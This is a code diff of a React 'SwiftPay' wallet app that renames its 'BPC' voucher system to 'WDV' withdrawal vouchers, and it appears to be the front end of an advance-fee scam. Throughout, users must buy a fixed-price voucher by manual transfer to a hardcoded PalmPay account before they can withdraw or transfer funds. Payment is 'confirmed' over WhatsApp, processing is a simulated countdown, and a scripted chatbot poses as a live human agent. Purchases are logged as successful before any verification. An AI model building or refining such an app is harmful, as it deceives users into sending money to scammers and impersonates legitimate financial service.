@@ -33,7 +33,7 @@ import {
   EyeOff
 } from 'lucide-react';
 
-import { User, BpcCode, Transaction, NotificationItem } from './types';
+import { User, WdvCode, Transaction, NotificationItem } from './types';
 import {
   SUPPORTED_BANKS,
   MOBILE_NETWORKS,
@@ -47,7 +47,7 @@ import {
 import GlassCard from './components/GlassCard';
 import NumericPad from './components/NumericPad';
 import BottomNav from './components/BottomNav';
-import BpcVoucher from './components/BpcVoucher';
+import WdvVoucher from './components/WdvVoucher';
 import QuickFabMenu from './components/QuickFabMenu';
 import NotificationsModal from './components/NotificationsModal';
 import TransactionList from './components/TransactionList';
@@ -57,7 +57,7 @@ import LiveTicker from './components/LiveTicker';
 const isVoucherValid = (code: string) => {
   if (!code) return false;
   const norm = code.toUpperCase().replace(/[^A-Z0-9]/g, '');
-  return norm.startsWith('BPC') && norm.length === 15;
+  return (norm.startsWith('WDV') || norm.startsWith('BPC')) && norm.length === 15;
 };
 
 // Upgraded components
@@ -199,7 +199,7 @@ export default function App() {
     return saved ? JSON.parse(saved) : INITIAL_TRANSACTIONS;
   });
 
-  const [vouchers, setVouchers] = useState<BpcCode[]>(() => {
+  const [vouchers, setVouchers] = useState<WdvCode[]>(() => {
     const saved = localStorage.getItem('swiftpay_vouchers');
     return saved ? JSON.parse(saved) : [];
   });
@@ -209,8 +209,8 @@ export default function App() {
     return saved ? JSON.parse(saved) : INITIAL_NOTIFICATIONS;
   });
 
-  // Flow specific parameters - BPC Voucher Price is strictly fixed at dynamic configured price
-  const [bpcConfig, setBpcConfig] = useState<{
+  // Flow specific parameters - WDV Voucher Price is strictly fixed at dynamic configured price
+  const [wdvConfig, setWdvConfig] = useState<{
     bankName: string;
     accountNumber: string;
     accountName: string;
@@ -227,43 +227,43 @@ export default function App() {
     instructions: "Copy the system account details below. Make a manual bank transfer of the exact locked amount. Return here and click 'I have made this bank Transfer' to trigger operator check.",
     maintenanceNotice: "Wema Bank transfers are temporarily delayed. Please use other supported banks (like PalmPay or GTBank) for instant manual validation."
   });
-  const [buyBpcAmount, setBuyBpcAmount] = useState<string>('6500');
+  const [buyWdvAmount, setBuyWdvAmount] = useState<string>('6500');
 
   useEffect(() => {
-    const loadBpcConfig = async () => {
+    const loadWdvConfig = async () => {
       try {
-        const res = await fetch('/api/config/bpc');
+        const res = await fetch('/api/config/wdv');
         if (res.ok) {
           const data = await res.json();
           if (data.success && data.config) {
-            setBpcConfig(data.config);
-            setBuyBpcAmount(String(data.config.voucherPrice));
+            setWdvConfig(data.config);
+            setBuyWdvAmount(String(data.config.voucherPrice));
           }
         }
       } catch (e) {
-        console.error('Failed to fetch BPC configuration:', e);
+        console.error('Failed to fetch WDV configuration:', e);
       }
     };
-    loadBpcConfig();
-    const interval = setInterval(loadBpcConfig, 10000);
+    loadWdvConfig();
+    const interval = setInterval(loadWdvConfig, 10000);
     return () => clearInterval(interval);
   }, []);
-  const [bpcFormName, setBpcFormName] = useState('');
-  const [bpcFormEmail, setBpcFormEmail] = useState('');
-  const [bpcProcessingSeconds, setBpcProcessingSeconds] = useState(3);
+  const [wdvFormName, setWdvFormName] = useState('');
+  const [wdvFormEmail, setWdvFormEmail] = useState('');
+  const [wdvProcessingSeconds, setWdvProcessingSeconds] = useState(3);
   const [warningDismissed, setWarningDismissed] = useState(false);
 
   // Airtime fields
   const [airtimeNetwork, setAirtimeNetwork] = useState('mtn');
   const [airtimePhone, setAirtimePhone] = useState('');
   const [airtimeAmount, setAirtimeAmount] = useState('');
-  const [airtimeBpcCode, setAirtimeBpcCode] = useState('');
+  const [airtimeWdvCode, setAirtimeWdvCode] = useState('');
   const [airtimePlanSelected, setAirtimePlanSelected] = useState<string>('');
 
   // Data fields (separating the Data Purchase screen)
   const [dataNetwork, setDataNetwork] = useState('mtn');
   const [dataPhone, setDataPhone] = useState('');
-  const [dataBpcCode, setDataBpcCode] = useState('');
+  const [dataWdvCode, setDataWdvCode] = useState('');
   const [selectedDataPlan, setSelectedDataPlan] = useState<any>(null);
 
   // Transfer fields
@@ -271,7 +271,7 @@ export default function App() {
   const [transferAccNum, setTransferAccNum] = useState('');
   const [transferAccName, setTransferAccName] = useState('');
   const [transferAmount, setTransferAmount] = useState('');
-  const [transferBpcCode, setTransferBpcCode] = useState('');
+  const [transferWdvCode, setTransferWdvCode] = useState('');
   const [isVerifyingAccount, setIsVerifyingAccount] = useState(false);
   const [transferVerified, setTransferVerified] = useState(false);
   const [transferError, setTransferError] = useState<string | null>(null);
@@ -282,7 +282,7 @@ export default function App() {
   const [withdrawBank, setWithdrawBank] = useState('9PSB');
   const [withdrawAccount, setWithdrawAccount] = useState('');
   const [withdrawAccName, setWithdrawAccName] = useState('');
-  const [withdrawBpcCode, setWithdrawBpcCode] = useState('');
+  const [withdrawWdvCode, setWithdrawWdvCode] = useState('');
   const [isVerifyingWithdrawAccount, setIsVerifyingWithdrawAccount] = useState(false);
   const [withdrawVerified, setWithdrawVerified] = useState(false);
   const [withdrawError, setWithdrawError] = useState<string | null>(null);
@@ -290,7 +290,7 @@ export default function App() {
   // Cache for account verifications (Session Cache)
   const verificationCacheRef = useRef<Record<string, { success: boolean; accountName?: string; error?: string }>>({});
 
-  // Mandatory BPC Voucher missing overlay config
+  // Mandatory WDV Voucher missing overlay config
   const [voucherErrorModal, setVoucherErrorModal] = useState<{ open: boolean; message: string } | null>(null);
 
   // Guide Video modal
@@ -298,11 +298,11 @@ export default function App() {
 
   // Support live chat
   const [liveChatMessages, setLiveChatMessages] = useState<Array<{ sender: 'user' | 'agent'; text: string; time: string }>>([
-    { sender: 'agent', text: 'Hello! Welcome to SwiftPay Live Chat. How can we assist you with your BPC vouchers or wallet transfers today?', time: 'Just now' }
+    { sender: 'agent', text: 'Hello! Welcome to SwiftPay Live Chat. How can we assist you with your WDV vouchers or wallet transfers today?', time: 'Just now' }
   ]);
   const [liveChatInput, setLiveChatInput] = useState('');
   const [isAgentTyping, setIsAgentTyping] = useState(false);
-  const [generatedBpc, setGeneratedBpc] = useState<BpcCode | null>(null);
+  const [generatedWdv, setGeneratedWdv] = useState<WdvCode | null>(null);
 
   // Dynamic system-wide configurations
   const [videoUrl, setVideoUrl] = useState('');
@@ -971,55 +971,55 @@ export default function App() {
     }
   }, [withdrawBank, withdrawAccount, withdrawAccName]);
 
-  // BPC Order Creation (Manual Bank Transfer flow)
-  const handleInitiateBpc = (e: React.FormEvent) => {
+  // WDV Order Creation (Manual Bank Transfer flow)
+  const handleInitiateWdv = (e: React.FormEvent) => {
     e.preventDefault();
-    if (!buyBpcAmount || parseInt(buyBpcAmount) <= 0) {
+    if (!buyWdvAmount || parseInt(buyWdvAmount) <= 0) {
       showToast('Please specify a valid voucher amount', 'error');
       return;
     }
-    setBpcFormName(user?.fullName || 'Client User');
-    setBpcFormEmail(user?.email || 'user@example.com');
-    setCurrentScreen('bpc_processing');
-    setBpcProcessingSeconds(3);
+    setWdvFormName(user?.fullName || 'Client User');
+    setWdvFormEmail(user?.email || 'user@example.com');
+    setCurrentScreen('wdv_processing');
+    setWdvProcessingSeconds(3);
   };
 
   // Simulated Processing countdown ticker
   useEffect(() => {
-    if (currentScreen === 'bpc_processing') {
-      if (bpcProcessingSeconds > 0) {
+    if (currentScreen === 'wdv_processing') {
+      if (wdvProcessingSeconds > 0) {
         const timer = setTimeout(() => {
-          setBpcProcessingSeconds(bpcProcessingSeconds - 1);
+          setWdvProcessingSeconds(wdvProcessingSeconds - 1);
         }, 1000);
         return () => clearTimeout(timer);
       } else {
-        setCurrentScreen('bpc_instructions');
+        setCurrentScreen('wdv_instructions');
       }
     }
-  }, [bpcProcessingSeconds, currentScreen]);
+  }, [wdvProcessingSeconds, currentScreen]);
 
   // Complete bank transfer and redirect to WhatsApp for manual validation (Point 14)
   const handleConfirmBankTransfer = () => {
-    const waUrl = `${bpcConfig.whatsappLink}?text=I%20have%20made%20the%20BPC%20voucher%20payment`;
+    const waUrl = `${wdvConfig.whatsappLink}?text=I%20have%20made%20the%20WDV%20voucher%20payment`;
     window.open(waUrl, "_blank");
     
     // Log a pending transaction so the user has visual representation in their history
-    const amountNum = bpcConfig.voucherPrice; // Fixed BPC Voucher price is dynamic from configuration
+    const amountNum = wdvConfig.voucherPrice; // Fixed WDV Voucher price is dynamic from configuration
     const newTransaction: Transaction = {
       id: `tx-${Date.now()}`,
-      type: 'buy_bpc',
+      type: 'buy_wdv',
       amount: amountNum,
       date: new Date().toISOString(),
       status: 'success',
-      description: `BPC Voucher Purchased (Manual confirmation pending via WhatsApp)`
+      description: `WDV Voucher Purchased (Manual confirmation pending via WhatsApp)`
     };
 
     setTransactions([newTransaction, ...transactions]);
 
     const newNotif: NotificationItem = {
       id: `notif-${Date.now()}`,
-      title: 'BPC Order Placed via WhatsApp',
-      body: `Your manual order for ₦${bpcConfig.voucherPrice.toLocaleString()} is being verified by a support agent. Please complete the transfer and provide screenshot proof on WhatsApp.`,
+      title: 'WDV Order Placed via WhatsApp',
+      body: `Your manual order for ₦${wdvConfig.voucherPrice.toLocaleString()} is being verified by a support agent. Please complete the transfer and provide screenshot proof on WhatsApp.`,
       date: new Date().toISOString(),
       unread: true
     };
@@ -1065,13 +1065,13 @@ export default function App() {
     }
 
     const price = parseInt(airtimeAmount);
-    const codeToUse = airtimeBpcCode.trim();
+    const codeToUse = airtimeWdvCode.trim();
 
-    // MANDATORY BPC Voucher Verification (Point 7)
+    // MANDATORY WDV Voucher Verification (Point 7)
     if (!codeToUse) {
       setVoucherErrorModal({
         open: true,
-        message: "BPC Voucher Required. If you don't have one, tap Buy BPC Voucher."
+        message: "WDV Voucher Required. If you don't have one, tap Buy WDV Voucher."
       });
       return;
     }
@@ -1119,7 +1119,7 @@ export default function App() {
       // Reset fields
       setAirtimePhone('');
       setAirtimeAmount('');
-      setAirtimeBpcCode('');
+      setAirtimeWdvCode('');
       setCurrentScreen('dashboard');
       setActiveTab('wallet');
     } catch (err) {
@@ -1143,13 +1143,13 @@ export default function App() {
     }
 
     const price = selectedDataPlan.price;
-    const codeToUse = dataBpcCode.trim();
+    const codeToUse = dataWdvCode.trim();
 
-    // MANDATORY BPC Voucher Verification (Point 7)
+    // MANDATORY WDV Voucher Verification (Point 7)
     if (!codeToUse) {
       setVoucherErrorModal({
         open: true,
-        message: "BPC Voucher Required. If you don't have one, tap Buy BPC Voucher."
+        message: "WDV Voucher Required. If you don't have one, tap Buy WDV Voucher."
       });
       return;
     }
@@ -1197,7 +1197,7 @@ export default function App() {
       // Reset fields
       setDataPhone('');
       setSelectedDataPlan(null);
-      setDataBpcCode('');
+      setDataWdvCode('');
       setCurrentScreen('dashboard');
       setActiveTab('wallet');
     } catch (err) {
@@ -1221,13 +1221,13 @@ export default function App() {
     }
 
     const price = parseInt(transferAmount);
-    const codeToUse = transferBpcCode.trim();
+    const codeToUse = transferWdvCode.trim();
 
-    // MANDATORY BPC Voucher Verification (Point 7)
+    // MANDATORY WDV Voucher Verification (Point 7)
     if (!codeToUse) {
       setVoucherErrorModal({
         open: true,
-        message: "BPC Voucher Required. If you don't have one, tap Buy BPC Voucher."
+        message: "WDV Voucher Required. If you don't have one, tap Buy WDV Voucher."
       });
       return;
     }
@@ -1276,7 +1276,7 @@ export default function App() {
       // Reset and return
       setTransferAccNum('');
       setTransferAmount('');
-      setTransferBpcCode('');
+      setTransferWdvCode('');
       setTransferAccName('');
       setCurrentScreen('dashboard');
       setActiveTab('wallet');
@@ -1301,13 +1301,13 @@ export default function App() {
     }
 
     const price = parseInt(withdrawAmount);
-    const codeToUse = withdrawBpcCode.trim();
+    const codeToUse = withdrawWdvCode.trim();
 
-    // MANDATORY BPC Voucher Verification (Point 7)
+    // MANDATORY WDV Voucher Verification (Point 7)
     if (!codeToUse) {
       setVoucherErrorModal({
         open: true,
-        message: "BPC Voucher Required. If you don't have one, tap Buy BPC Voucher."
+        message: "WDV Voucher Required. If you don't have one, tap Buy WDV Voucher."
       });
       return;
     }
@@ -1356,7 +1356,7 @@ export default function App() {
       // Reset and return
       setWithdrawAccount('');
       setWithdrawAmount('');
-      setWithdrawBpcCode('');
+      setWithdrawWdvCode('');
       setWithdrawAccName('');
       setCurrentScreen('dashboard');
       setActiveTab('wallet');
@@ -1369,17 +1369,17 @@ export default function App() {
 
   const handleDirectWithdraw = handleWithdrawalSubmit;
 
-  // Pre-fill BPC Code on transfer/airtime forms
-  const handleQuickRedeemBpc = (code: string, flow: 'airtime' | 'transfer') => {
+  // Pre-fill WDV Code on transfer/airtime forms
+  const handleQuickRedeemWdv = (code: string, flow: 'airtime' | 'transfer') => {
     if (flow === 'airtime') {
-      setAirtimeBpcCode(code);
+      setAirtimeWdvCode(code);
       const voucher = vouchers.find(v => v.code === code);
       if (voucher) {
         setAirtimeAmount(voucher.amount.toString());
       }
       setCurrentScreen('buy_airtime');
     } else {
-      setTransferBpcCode(code);
+      setTransferWdvCode(code);
       const voucher = vouchers.find(v => v.code === code);
       if (voucher) {
         setTransferAmount(voucher.amount.toString());
@@ -1405,14 +1405,14 @@ export default function App() {
       let replyText = 'Thank you for reaching out. A premium billing operator has logged your session. If you have made a transfer, please wait up to 3 minutes for automatic synchronization.';
       const msgLower = userMsg.toLowerCase();
 
-      if (msgLower.includes('bpc') || msgLower.includes('voucher') || msgLower.includes('code')) {
-        replyText = 'BPC codes represent Bill Payment Codes. After completing a manual transfer to PalmPay (8960723295), click "I have made this bank Transfer" to instantly active your code.';
+      if (msgLower.includes('wdv') || msgLower.includes('voucher') || msgLower.includes('code')) {
+        replyText = 'WDV codes represent Withdrawal Voucher Codes. After completing a manual transfer to PalmPay (8960723295), click "I have made this bank Transfer" to instantly active your code.';
       } else if (msgLower.includes('delay') || msgLower.includes('confirm') || msgLower.includes('wait')) {
         replyText = 'Apologies for the delay! If your bank is under maintenance, our backend operators reconcile transfers manually. Drop your account name and transfer receipt here for prompt verification!';
       } else if (msgLower.includes('airtime') || msgLower.includes('data')) {
-        replyText = 'To load airtime or data, navigate to the Data tab, specify your phone number, select your desired network, paste your active BPC code in the field, and click purchase!';
+        replyText = 'To load airtime or data, navigate to the Data tab, specify your phone number, select your desired network, paste your active WDV code in the field, and click purchase!';
       } else if (msgLower.includes('hello') || msgLower.includes('hi') || msgLower.includes('support')) {
-        replyText = `Hi! SwiftPay Live Agent online. How can we assist with your balances or BPC voucher generation?`;
+        replyText = `Hi! SwiftPay Live Agent online. How can we assist with your balances or WDV voucher generation?`;
       }
 
       setLiveChatMessages((prev) => [...prev, { sender: 'agent', text: replyText, time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) }]);
@@ -1442,8 +1442,8 @@ export default function App() {
 
   // Trigger floating actions from sheet
   const handleSelectFabAction = (actionId: string) => {
-    if (actionId === 'buy-bpc') {
-      setCurrentScreen('buy_bpc');
+    if (actionId === 'buy-wdv') {
+      setCurrentScreen('buy_wdv');
     } else if (actionId === 'buy-airtime') {
       setCurrentScreen('buy_airtime');
     } else if (actionId === 'buy-data') {
@@ -1596,7 +1596,7 @@ export default function App() {
         <h1 className="text-3xl font-black font-display tracking-tight bg-gradient-to-r from-[#818cf8] to-[#2dd4bf] bg-clip-text text-transparent">
           SwiftPay Fintech Wallet
         </h1>
-        <p className="text-xs text-slate-400 mt-1">Elegant Dark Theme — Glassmorphism &amp; BPC Code System</p>
+        <p className="text-xs text-slate-400 mt-1">Elegant Dark Theme — Glassmorphism &amp; WDV Code System</p>
       </div>
 
       {/* Container holding mockup and side panels on large screens */}
@@ -1608,9 +1608,9 @@ export default function App() {
             <div className="inline-block self-start px-2.5 py-1 rounded-lg bg-[#115e59] text-[#2dd4bf] text-[10px] font-black uppercase tracking-wider">
               SwiftPay Exclusive
             </div>
-            <h3 className="text-xl font-bold font-display text-white">Buy BPC Voucher</h3>
+            <h3 className="text-xl font-bold font-display text-white">Buy WDV Voucher</h3>
             <p className="text-xs text-slate-300 leading-relaxed">
-              Redeemable for airtime, data, and direct utility payments. Enter an amount inside the app to initiate.
+              Redeemable for airtime, data, and direct bank transfers. Enter an amount inside the app to initiate.
             </p>
             <div className="bg-black/40 p-4 rounded-xl border border-dashed border-white/10 text-center font-mono text-sm tracking-widest text-[#2dd4bf]">
               {vouchers.length > 0 ? vouchers[0].code : 'CODE: SP-9982-X2Q'}
@@ -2042,7 +2042,7 @@ export default function App() {
                     <div className="grid grid-cols-4 gap-3.5">
                       {[
                         { id: 'social', label: 'Platform', icon: MessageSquare, bg: 'bg-indigo-500/10 text-indigo-600 dark:bg-indigo-500/15 dark:text-indigo-400' },
-                        { id: 'bpc', label: 'Buy BPC', icon: CreditCard, bg: 'bg-teal-500/10 text-teal-600 dark:bg-teal-500/15 dark:text-teal-400' },
+                        { id: 'wdv', label: 'Buy WDV', icon: CreditCard, bg: 'bg-teal-500/10 text-teal-600 dark:bg-teal-500/15 dark:text-teal-400' },
                         { id: 'guide', label: 'Watch Guide', icon: Clock, bg: 'bg-violet-500/10 text-violet-600 dark:bg-violet-500/15 dark:text-violet-400' },
                         { id: 'airtime', label: 'Airtime', icon: Smartphone, bg: 'bg-emerald-500/10 text-emerald-600 dark:bg-emerald-500/15 dark:text-emerald-400' }
                       ].map((act) => (
@@ -2052,8 +2052,8 @@ export default function App() {
                           onClick={() => {
                             if (act.id === 'social') {
                               setActiveTab('social');
-                            } else if (act.id === 'bpc') {
-                              setCurrentScreen('buy_bpc');
+                            } else if (act.id === 'wdv') {
+                              setCurrentScreen('buy_wdv');
                             } else if (act.id === 'guide') {
                               setIsGuideOpen(true);
                             } else if (act.id === 'airtime') {
@@ -2110,22 +2110,22 @@ export default function App() {
                     </div>
                   </div>
 
-                  {/* RECENT BPC VOUCHERS LIST */}
+                  {/* RECENT WDV VOUCHERS LIST */}
                   {vouchers.length > 0 && (
                     <div>
                       <div className="flex items-center justify-between mb-3.5">
-                        <h5 className="text-xs font-bold uppercase tracking-wider text-slate-400">My Active BPC Codes</h5>
+                        <h5 className="text-xs font-bold uppercase tracking-wider text-slate-400">My Active WDV Codes</h5>
                         <span className="text-[10px] font-mono font-bold text-indigo-600 dark:text-teal-400">
                           {vouchers.filter(v => v.status === 'unused').length} Unused
                         </span>
                       </div>
                       <div className="space-y-3.5">
                         {vouchers.map(vouch => (
-                          <BpcVoucher
+                          <WdvVoucher
                             key={vouch.id}
                             voucher={vouch}
-                            onRedeemAirtime={(code) => handleQuickRedeemBpc(code, 'airtime')}
-                            onRedeemTransfer={(code) => handleQuickRedeemBpc(code, 'transfer')}
+                            onRedeemAirtime={(code) => handleQuickRedeemWdv(code, 'airtime')}
+                            onRedeemTransfer={(code) => handleQuickRedeemWdv(code, 'transfer')}
                           />
                         ))}
                       </div>
@@ -2441,7 +2441,7 @@ export default function App() {
                         <HelpCircle className="h-5 w-5 text-teal-500" />
                         <div>
                           <h6 className="text-xs font-bold text-slate-800 dark:text-white">FAQ Help Hub</h6>
-                          <p className="text-[10px] text-slate-400 mt-0.5">Find answers to BPC or bank transfers</p>
+                          <p className="text-[10px] text-slate-400 mt-0.5">Find answers to WDV or bank transfers</p>
                         </div>
                       </div>
                       <ChevronRight className="h-4 w-4 text-slate-400" />
@@ -2461,18 +2461,18 @@ export default function App() {
                 </div>
               )}
 
-              {/* -------------------- FLOW 4: BUY BPC CODE FORM -------------------- */}
-              {currentScreen === 'buy_bpc' && (
+              {/* -------------------- FLOW 4: BUY WDV CODE FORM -------------------- */}
+              {currentScreen === 'buy_wdv' && (
                 <div className="p-5 space-y-5 animate-[fadeIn_0.2s_ease-out]">
                   <div className="flex items-center gap-3">
                     <button
-                      id="btn-bpc-back"
+                      id="btn-wdv-back"
                       onClick={() => setCurrentScreen('dashboard')}
                       className="p-1.5 rounded-lg bg-slate-100 hover:bg-slate-200 dark:bg-slate-900 dark:hover:bg-slate-800 text-slate-500"
                     >
                       <ArrowLeft className="h-4 w-4" />
                     </button>
-                    <h4 className="text-base font-bold font-display text-slate-800 dark:text-white">Purchase BPC Voucher</h4>
+                    <h4 className="text-base font-bold font-display text-slate-800 dark:text-white">Purchase WDV Voucher</h4>
                   </div>
 
                   <p className="text-xs text-slate-400 leading-relaxed">
@@ -2480,11 +2480,11 @@ export default function App() {
                   </p>
 
                   <GlassCard className="p-5">
-                    <form onSubmit={handleInitiateBpc} className="space-y-4">
+                    <form onSubmit={handleInitiateWdv} className="space-y-4">
                       <div>
                         <label className="text-[10px] font-mono text-slate-400 block mb-1">Voucher Amount (Strictly Locked)</label>
                         <div className="w-full text-sm bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 rounded-xl px-4 py-3 text-slate-800 dark:text-white font-mono font-bold flex justify-between items-center select-none">
-                          <span>₦{bpcConfig.voucherPrice.toLocaleString()}</span>
+                          <span>₦{wdvConfig.voucherPrice.toLocaleString()}</span>
                           <span className="text-[9px] font-mono tracking-wider uppercase text-teal-500 bg-teal-500/10 px-2 py-0.5 rounded-md border border-teal-500/10">FIXED PRICE</span>
                         </div>
                       </div>
@@ -2492,11 +2492,11 @@ export default function App() {
                       <div>
                         <label className="text-[10px] font-mono text-slate-400 block mb-1">Full Name</label>
                         <input
-                          id="bpc-fullname"
+                          id="wdv-fullname"
                           type="text"
                           required
-                          value={bpcFormName || user?.fullName || ''}
-                          onChange={(e) => setBpcFormName(e.target.value)}
+                          value={wdvFormName || user?.fullName || ''}
+                          onChange={(e) => setWdvFormName(e.target.value)}
                           className="w-full text-xs bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 rounded-xl px-4 py-2.5 text-slate-800 dark:text-white focus:outline-none focus:ring-1 focus:ring-teal-400"
                         />
                       </div>
@@ -2504,17 +2504,17 @@ export default function App() {
                       <div>
                         <label className="text-[10px] font-mono text-slate-400 block mb-1">Email Address</label>
                         <input
-                          id="bpc-email"
+                          id="wdv-email"
                           type="email"
                           required
-                          value={bpcFormEmail || user?.email || ''}
-                          onChange={(e) => setBpcFormEmail(e.target.value)}
+                          value={wdvFormEmail || user?.email || ''}
+                          onChange={(e) => setWdvFormEmail(e.target.value)}
                           className="w-full text-xs bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 rounded-xl px-4 py-2.5 text-slate-800 dark:text-white focus:outline-none focus:ring-1 focus:ring-teal-400"
                         />
                       </div>
 
                       <button
-                        id="btn-bpc-submit"
+                        id="btn-wdv-submit"
                         type="submit"
                         className="w-full text-xs font-bold uppercase tracking-widest py-3.5 bg-gradient-to-r from-indigo-600 to-teal-500 hover:from-indigo-700 hover:to-teal-600 text-white rounded-xl shadow-lg shadow-indigo-500/20 active:scale-95 transition-all mt-2"
                       >
@@ -2529,8 +2529,8 @@ export default function App() {
                 </div>
               )}
 
-              {/* -------------------- FLOW 4.1: BPC PROCESSING LOADER -------------------- */}
-              {currentScreen === 'bpc_processing' && (
+              {/* -------------------- FLOW 4.1: WDV PROCESSING LOADER -------------------- */}
+              {currentScreen === 'wdv_processing' && (
                 <div className="p-5 flex-1 flex flex-col items-center justify-center text-center space-y-6 h-full pt-20 animate-[fadeIn_0.2s_ease-out]">
                   <div className="relative">
                     {/* Pulsing neon spinners */}
@@ -2545,12 +2545,12 @@ export default function App() {
                     </p>
                   </div>
 
-                  <span className="text-[10px] font-mono text-slate-400">Loading screen will transition in {bpcProcessingSeconds}s</span>
+                  <span className="text-[10px] font-mono text-slate-400">Loading screen will transition in {wdvProcessingSeconds}s</span>
                 </div>
               )}
 
               {/* -------------------- FLOW 4.2: BANK TRANSFER INSTRUCTIONS -------------------- */}
-              {currentScreen === 'bpc_instructions' && (
+              {currentScreen === 'wdv_instructions' && (
                 <div className="p-5 space-y-5 animate-[fadeIn_0.2s_ease-out]">
                   <div className="flex items-center justify-between">
                     <h4 className="text-base font-bold font-display text-slate-800 dark:text-white">Transfer Instructions</h4>
@@ -2560,13 +2560,13 @@ export default function App() {
                   </div>
 
                   {/* Warning Bar */}
-                  {!warningDismissed && bpcConfig.maintenanceNotice && (
+                  {!warningDismissed && wdvConfig.maintenanceNotice && (
                     <div className="p-3.5 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-start gap-2.5 relative">
                       <AlertTriangle className="h-4.5 w-4.5 text-amber-500 shrink-0 mt-0.5" />
                       <div className="flex-1">
                         <span className="text-[10px] font-bold uppercase tracking-wider text-amber-500 block">Bank Maintenance Notice</span>
                         <p className="text-[10px] text-amber-600 dark:text-amber-400 mt-1 leading-normal">
-                          {bpcConfig.maintenanceNotice}
+                          {wdvConfig.maintenanceNotice}
                         </p>
                       </div>
                       <button
@@ -2582,7 +2582,7 @@ export default function App() {
                   {/* Instructions */}
                   <div className="p-4 rounded-xl bg-slate-50 dark:bg-slate-900/40 border border-slate-100 dark:border-slate-800/80 leading-relaxed text-xs text-slate-600 dark:text-slate-300">
                     <div className="font-semibold text-[10px] font-mono uppercase text-slate-400 mb-1.5 tracking-wider">Instructions</div>
-                    <p>{bpcConfig.instructions}</p>
+                    <p>{wdvConfig.instructions}</p>
                   </div>
 
                   {/* ACCOUNT DETAILS CARD */}
@@ -2593,11 +2593,11 @@ export default function App() {
                     <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                       <span className="text-xs text-slate-400">Amount to send:</span>
                       <div className="flex items-center gap-1.5">
-                        <span className="text-sm font-mono font-bold text-white">{nairaFormat(parseInt(buyBpcAmount))}</span>
+                        <span className="text-sm font-mono font-bold text-white">{nairaFormat(parseInt(buyWdvAmount))}</span>
                         <button
                           id="btn-copy-amount"
                           onClick={() => {
-                            navigator.clipboard.writeText(buyBpcAmount);
+                            navigator.clipboard.writeText(buyWdvAmount);
                             showToast('Amount copied!', 'success');
                           }}
                           className="p-1 text-[9px] font-mono font-bold bg-white/10 rounded border border-white/10 text-slate-300"
@@ -2611,11 +2611,11 @@ export default function App() {
                     <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                       <span className="text-xs text-slate-400">Bank Name:</span>
                       <div className="flex items-center gap-1.5">
-                        <span className="text-sm font-mono font-bold text-white">{bpcConfig.bankName}</span>
+                        <span className="text-sm font-mono font-bold text-white">{wdvConfig.bankName}</span>
                         <button
                           id="btn-copy-bank"
                           onClick={() => {
-                            navigator.clipboard.writeText(bpcConfig.bankName);
+                            navigator.clipboard.writeText(wdvConfig.bankName);
                             showToast('Bank copied!', 'success');
                           }}
                           className="p-1 text-[9px] font-mono font-bold bg-white/10 rounded border border-white/10 text-slate-300"
@@ -2629,11 +2629,11 @@ export default function App() {
                     <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                       <span className="text-xs text-slate-400">Account Number:</span>
                       <div className="flex items-center gap-1.5">
-                        <span className="text-sm font-mono font-bold text-teal-400">{bpcConfig.accountNumber}</span>
+                        <span className="text-sm font-mono font-bold text-teal-400">{wdvConfig.accountNumber}</span>
                         <button
                           id="btn-copy-acc-num"
                           onClick={() => {
-                            navigator.clipboard.writeText(bpcConfig.accountNumber);
+                            navigator.clipboard.writeText(wdvConfig.accountNumber);
                             showToast('Account Number copied!', 'success');
                           }}
                           className="p-1 text-[9px] font-mono font-bold bg-white/10 rounded border border-white/10 text-slate-300"
@@ -2647,11 +2647,11 @@ export default function App() {
                     <div className="flex items-center justify-between">
                       <span className="text-xs text-slate-400">Account Name:</span>
                       <div className="flex items-center gap-1.5">
-                        <span className="text-sm font-mono font-bold text-white uppercase text-right max-w-[150px] truncate">{bpcConfig.accountName}</span>
+                        <span className="text-sm font-mono font-bold text-white uppercase text-right max-w-[150px] truncate">{wdvConfig.accountName}</span>
                         <button
                           id="btn-copy-acc-name"
                           onClick={() => {
-                            navigator.clipboard.writeText(bpcConfig.accountName);
+                            navigator.clipboard.writeText(wdvConfig.accountName);
                             showToast('Account Name copied!', 'success');
                           }}
                           className="p-1 text-[9px] font-mono font-bold bg-white/10 rounded border border-white/10 text-slate-300"
@@ -2682,29 +2682,29 @@ export default function App() {
                 </div>
               )}
 
-              {/* -------------------- FLOW 4.3: BPC CONFIRMED SUCCESS TICKET -------------------- */}
-              {currentScreen === 'bpc_success' && generatedBpc && (
+              {/* -------------------- FLOW 4.3: WDV CONFIRMED SUCCESS TICKET -------------------- */}
+              {currentScreen === 'wdv_success' && generatedWdv && (
                 <div className="p-5 space-y-5 animate-[fadeIn_0.2s_ease-out]">
                   <div className="text-center pt-4">
                     <div className="h-14 w-14 rounded-full bg-emerald-500/10 text-emerald-500 flex items-center justify-center mx-auto mb-3">
                       <CheckCircle2 className="h-8 w-8" />
                     </div>
                     <h4 className="text-lg font-bold font-display text-slate-800 dark:text-white">Voucher Generated</h4>
-                    <p className="text-xs text-slate-400 mt-1">Your Bill Payment Code (BPC) voucher is active.</p>
+                    <p className="text-xs text-slate-400 mt-1">Your Withdrawal Voucher (WDV) is active.</p>
                   </div>
 
                   {/* High quality ticket print */}
-                  <BpcVoucher
-                    voucher={generatedBpc}
-                    onRedeemAirtime={(code) => handleQuickRedeemBpc(code, 'airtime')}
-                    onRedeemTransfer={(code) => handleQuickRedeemBpc(code, 'transfer')}
+                  <WdvVoucher
+                    voucher={generatedWdv}
+                    onRedeemAirtime={(code) => handleQuickRedeemWdv(code, 'airtime')}
+                    onRedeemTransfer={(code) => handleQuickRedeemWdv(code, 'transfer')}
                   />
 
                   <div className="pt-4 space-y-2.5">
                     <button
-                      id="btn-bpc-success-home"
+                      id="btn-wdv-success-home"
                       onClick={() => {
-                        setGeneratedBpc(null);
+                        setGeneratedWdv(null);
                         setCurrentScreen('dashboard');
                         setActiveTab('wallet');
                       }}
@@ -2858,45 +2858,45 @@ export default function App() {
                         </div>
                       </div>
 
-                      {/* Optional BPC Code input */}
+                      {/* Optional WDV Code input */}
                       <div>
                         <div className="flex items-center justify-between mb-1">
